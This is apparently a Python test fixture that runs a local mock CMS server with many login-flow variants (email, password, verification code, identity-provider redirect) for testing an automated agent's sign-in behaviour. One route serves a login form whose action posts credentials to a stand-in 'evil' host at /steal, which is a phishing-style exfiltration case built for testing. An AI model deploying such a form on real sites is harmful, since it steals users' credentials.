"""Local CMS with a real login flow, for credential tests. Test credentials only; never production ones."""
from __future__ import annotations

import threading
from http.cookies import SimpleCookie
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

EMAIL, PASSWORD = "tester@example.com", "correct-horse-battery"
EDITOR_HTML = (__import__("pathlib").Path(__file__).parent / "mock_cms_publish.html").read_text()


_FX = __import__('pathlib').Path(__file__).parent
B_HOME = (_FX / 'b_home.html').read_text()
B_EDITOR = (_FX / 'b_editor.html').read_text()
B_PROJECT = (_FX / 'b_project.html').read_text()
B_BLOG = (_FX / 'blog_post.html').read_text()


class State:
    def __init__(self) -> None:
        self.sessions: set[str] = set()
        self.posted: list[dict] = []  # every body POSTed to /login (to assert where credentials went)
        self.login_attempts = 0
        self.mfa = False
        self.n = 0
        self.port = 0

    def signin_url(self, current_path: str) -> str:
        """Where the 'Log in' link points: this site, or a separate identity domain for /public-idp."""
        return f"http://localhost:{self.port}/idp/signin" if current_path.startswith("/public-idp") else "/signin"


def make_handler(state: State, evil_host: str):
    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _authed(self) -> bool:
            c = SimpleCookie(self.headers.get("Cookie", ""))
            return "sid" in c and c["sid"].value in state.sessions

        def _send(self, body: str, status=200, headers=None):
            self.send_response(status)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            for k, v in (headers or {}).items():
                self.send_header(k, v)
            self.end_headers()
            self.wfile.write(body.encode())

        def _redirect(self, to: str, headers=None):
            self.send_response(302)
            self.send_header("Location", to)
            for k, v in (headers or {}).items():
                self.send_header(k, v)
            self.end_headers()

        def _public(self, title_suffix=""):
            if self._authed():
                body = ("<nav><a href='/admin/new'>New Article</a> <a href='/hire'>Hire a Freelancer</a> "
                        "<a href='/logout'>Logout</a></nav><h1>Welcome back</h1>")
            else:
                body = ("<header><a href='%s'>Log in</a> <a href='/signup'>Sign up</a></header>"
                        "<h1>Welcome</h1><a href='/hire'>Hire a Freelancer</a>" % state.signin_url(self.path))
            return f"<html><head><title>Public Home</title></head><body>{body}</body></html>"

        def _email_page(self, action, error=""):
            err = f'<div role="alert">{error}</div>' if error else ""
            return (f"<html><head><title>Sign in</title></head><body><h1>Sign in</h1>{err}"
                    f'<form method="post" action="{action}"><input name="email" type="email" placeholder="Email address">'
                    "<button type='submit'>Continue</button></form></body></html>")

        def _code_page(self, action, error=""):
            err = f'<div role="alert">{error}</div>' if error else ""
            return ("<html><head><title>Verify</title></head><body><h1>Check your email</h1>" + err +
                    "<p>Enter the code we sent to your email address.</p>"
                    f'<form method="post" action="{action}"><input name="code" placeholder="Enter code">'
                    "<button type='submit'>Verify</button></form></body></html>")

        def _password_page(self, action, email, error=""):
            err = f'<div role="alert">{error}</div>' if error else ""
            return (f"<html><head><title>Sign in</title></head><body><h1>Enter your password</h1>{err}"
                    f'<form method="post" action="{action}"><input type="hidden" name="email" value="{email}">'
                    "<input name='password' type='password'><button type='submit'>Continue</button></form></body></html>")

        def _login_page(self, error="", action="/login", captcha=False):
            err = f'<div role="alert">{error}</div>' if error else ""
            cap = '<div class="g-recaptcha"></div>' if captcha else ""
            return (f"<html><head><title>Sign in</title></head><body><h1>Sign in</h1>{err}{cap}"
                    f'<form method="post" action="{action}"><label>Email<input name="email" type="email"></label>'
                    '<label>Password<input name="password" type="password"></label>'
                    '<button type="submit">Log in</button></form></body></html>')

        def do_GET(self):
            u = urlparse(self.path)
            if u.path == "/login":
                return self._send(self._login_page())
            if u.path == "/login-captcha":
                return self._send(self._login_page(captcha=True))
            if u.path == "/login-evil-action":
                return self._send(self._login_page(action=f"http://{evil_host}/steal"))
            if u.path in ("/public", "/public-idp"):
                return self._send(self._public())
            if u.path == "/signin":
                return self._send(self._email_page("/signin/email"))
            if u.path == "/signin-verify":
                return self._send(self._email_page("/signin-verify/email"))
            if u.path == "/signin-code":
                return self._send(self._email_page("/signin-code/email"))
            if u.path == "/signin-code2":
                return self._send(self._email_page("/signin-code2/email"))
            if u.path == "/signin-slow":
                return self._send(self._email_page("/signin-slow/email"))
            if u.path == "/signin-social":
                return self._send(self._email_page("/signin-social/email"))
            if u.path == "/idp/signin":
                return self._send(self._email_page("/idp/email"))
            if u.path == "/hire":  # a marketing link that bounces to the identity provider
                return self._redirect(f"http://localhost:{state.port}/idp/signin?client=site&email_hint=" + EMAIL.replace("@", "%40"))
            if u.path == "/sso-callback":
                if parse_qs(u.query).get("code") == ["ok"]:
                    state.n += 1
                    sid = f"s{state.n}"
                    state.sessions.add(sid)
                    return self._redirect("/public-idp", {"Set-Cookie": f"sid={sid}; Path=/"})
                return self._send("bad code", 400)
            if u.path == "/__expire":
                state.sessions.clear()
                return self._send("expired")
            if u.path == "/logout":
                return self._redirect("/login", {"Set-Cookie": "sid=; Max-Age=0; Path=/"})
            if u.path in ("/studio", "/studio2", "/jobs", "/pricing", "/dead-end", "/gone-page"):
                if not self._authed():
                    return self._redirect("/login")
                menu = ("<button id='create' type='button' onclick=\"document.getElementById('menu').hidden=false\">Create</button>"
                        "<div id='menu' hidden><a role='menuitem' href='/admin/new'>Project</a></div>")
                pages = {
                    "/studio": ("Studio", "<a href='/hire'>Hire a Freelancer</a> <a href='/jobs'>Jobs</a> <a href='/pricing'>Pricing</a> " + menu),
                    "/studio2": ("Studio", "<a href='/dead-end'>New Post</a> <a href='/jobs'>Jobs</a> " + menu),
                    "/jobs": ("Jobs", "<p>Open positions</p><a href='/studio'>Home</a>"),
                    "/pricing": ("Pricing", "<p>Plans</p>"),
                    "/dead-end": ("Broken Page", "<p>Nothing to create here</p>"),
                    "/gone-page": ("Gone", "<p>The old editor address</p>"),
                }
                title, body = pages[u.path]
                return self._send(f"<html><head><title>{title}</title></head><body><header>{body}</header>"
                                  "<a href='/logout'>Logout</a></body></html>")
            if u.path in ("/b/home", "/b/editor"):
                if not self._authed():
                    return self._redirect("/login")
                return self._send(B_HOME if u.path == "/b/home" else B_EDITOR)
            if u.path == "/b/project":
                return self._send(B_PROJECT)
            if u.path == "/blog-post":
                return self._send(B_BLOG)
            if u.path in ("/", "/dashboard", "/admin/new", "/admin/posts"):
                if not self._authed():
                    return self._redirect("/login")
                if u.path == "/admin/new":
                    return self._send(EDITOR_HTML)
                if u.path == "/admin/posts":
                    return self._send("<html><title>Posts</title><body><h1>Posts</h1><a href='/admin/new'>New Article</a></body></html>")
                return self._send("<html><title>Dashboard</title><body><h1>Dashboard</h1><nav>"
                                  "<a href='/admin/posts'>Posts</a> <a href='/admin/new'>New Article</a> "
                                  "<a href='/logout'>Logout</a></nav></body></html>")
            self._send("not found", 404)

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            form = {k: v[0] for k, v in parse_qs(self.rfile.read(length).decode()).items()}
            if self.path == "/steal":
                state.posted.append({"evil": True, **form})
                return self._send("thanks")
            if self.path == "/signin-verify/email":   # email -> "Verify your identity" + Continue -> code -> password
                state.posted.append({"path": self.path, **form})
                if form.get("email") != EMAIL:
                    return self._send(self._email_page(self.path, "No account found for that email"))
                return self._send("<html><head><title>Verify</title></head><body><h1>Verify your identity</h1>"
                                  "<p>To confirm your identity we'll send you a verification code to s••••m@g••••l.com</p>"
                                  "<form method='post' action='/signin-verify/send'><button type='submit'>Continue</button></form>"
                                  "<a href='/signin-verify'>Sign in to a different account</a></body></html>")
            if self.path == "/signin-verify/send":
                state.posted.append({"path": self.path})
                return self._send(self._code_page("/signin-code/verify"))
            if self.path in ("/signin-code/email", "/signin-code2/email"):
                state.posted.append({"path": self.path, **form})
                if form.get("email") != EMAIL:
                    return self._send(self._email_page(self.path, "No account found for that email"))
                if self.path.startswith("/signin-code2"):   # email -> password -> code
                    return self._send(self._password_page("/signin-code2/password", form["email"]))
                return self._send(self._code_page("/signin-code/verify"))   # email -> code -> password
            if self.path == "/signin-code/verify":
                state.posted.append({"path": self.path, **form})
                if form.get("code") == "123456":
                    return self._send(self._password_page("/signin/password", EMAIL))
                return self._send(self._code_page(self.path, "Wrong code"))
            if self.path == "/signin-code2/password":
                state.posted.append({"path": self.path, **form})
                if form.get("password") == PASSWORD:
                    return self._send(self._code_page("/signin-code2/verify"))
                return self._send(self._password_page(self.path, form.get("email", ""), "Incorrect password"))
            if self.path == "/signin-code2/verify":
                state.posted.append({"path": self.path, **form})
                if form.get("code") == "123456":
                    state.n += 1
                    sid = f"s{state.n}"
                    state.sessions.add(sid)
                    return self._redirect("/public", {"Set-Cookie": f"sid={sid}; Path=/"})
                return self._send(self._code_page(self.path, "Wrong code"))
            if self.path == "/signin-slow/email":
                state.posted.append({"path": self.path, **form})
                if form.get("email") != EMAIL:
                    return self._send(self._email_page(self.path, "No account found for that email"))
                # like a single-page app: the address changes at once, the password box is drawn a moment later
                return self._send("<html><head><title>Sign in</title></head><body><h1>Sign in</h1><p>Checking your account...</p>"
                                  "<div id='slot'></div><script>history.replaceState(null, '', '/signin-slow/step2');"
                                  "setTimeout(() => { document.getElementById('slot').innerHTML = "
                                  "'<form method=post action=/signin/password><input type=hidden name=email value=%s>"
                                  "<input name=password type=password><button type=submit>Continue</button></form>'; }, 1500);"
                                  "</script></body></html>" % form["email"])
            if self.path == "/signin-social/email":
                state.posted.append({"path": self.path, **form})
                return self._send("<html><head><title>Sign in</title></head><body><h1>Choose how to continue</h1>"
                                  "<button type='button'>Continue with Google</button></body></html>")
            if self.path in ("/signin/email", "/idp/email"):
                state.posted.append({"path": self.path, **form})
                pw_action = self.path.replace("email", "password")
                if form.get("email") == EMAIL:
                    return self._send(self._password_page(pw_action, form["email"]))
                return self._send(self._email_page(self.path, "No account found for that email"))
            if self.path in ("/signin/password", "/idp/password"):
                state.posted.append({"path": self.path, **form})
                state.login_attempts += 1
                if form.get("email") == EMAIL and form.get("password") == PASSWORD:
                    if self.path.startswith("/idp"):
                        return self._redirect(f"http://127.0.0.1:{state.port}/sso-callback?code=ok")
                    state.n += 1
                    sid = f"s{state.n}"
                    state.sessions.add(sid)
                    return self._redirect("/public", {"Set-Cookie": f"sid={sid}; Path=/"})
                return self._send(self._password_page(self.path, form.get("email", ""), "Incorrect password"))
            if self.path == "/login":
                state.posted.append(form)
                state.login_attempts += 1
                if form.get("email") == EMAIL and form.get("password") == PASSWORD:
                    state.n += 1
                    sid = f"s{state.n}"
                    state.sessions.add(sid)
                    return self._redirect("/dashboard", {"Set-Cookie": f"sid={sid}; Path=/"})
                return self._send(self._login_page("Invalid email or password"))
            self._send("not found", 404)
    return H


class LoginServer:
    def __init__(self) -> None:
        self.state = State()
        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(self.state, "localhost:9"))
        self.port = self.httpd.server_address[1]
        self.state.port = self.port
        self.base = f"http://127.0.0.1:{self.port}"
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *a):
        self.httpd.shutdown()
        self.httpd.server_close()
